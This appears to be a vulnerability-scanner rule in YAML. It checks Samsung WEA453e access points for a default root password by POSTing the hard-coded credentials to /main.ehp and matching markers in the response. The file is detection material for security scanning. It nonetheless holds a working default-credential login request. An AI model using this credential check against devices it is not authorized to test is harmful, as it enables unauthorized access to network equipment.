expression: r0()
id: samsung-wea453e-default-pwd
info:
  author: sharecast
  name: Samsung Wea453e Default Password
  severity: high
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(bytes("document.formParent2.changepasswd1.value"))
      && response.body.bcontains(bytes("passwd_change.ehp"))
    request:
      body: 'httpd;General;lang=en&login_id=root&login_pw=sweap12~

        '
      method: POST
      path: /main.ehp
